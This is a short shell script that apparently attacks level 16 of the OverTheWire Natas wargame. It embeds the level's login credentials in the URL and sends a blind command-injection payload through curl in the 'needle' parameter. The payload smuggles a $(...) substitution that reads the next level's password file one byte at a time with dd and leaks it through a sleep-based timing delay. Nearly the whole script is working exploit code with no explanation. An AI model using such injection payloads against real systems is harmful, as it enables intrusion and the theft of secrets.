#!/bin/sh
host="natas16:3VfCzgaWjEAcmCQphiEPoXi9HtlmVr3L@natas16.natas.labs.overthewire.org"

cmd='$(sleep $(( $(test $(dd if=/etc/natas_webpass/natas17 bs=1 count=1 skip=1 2>/dev/null) = a) 10 + 10*$?)))'
echo $cmd
curl "http://$host/?needle="+$cmd


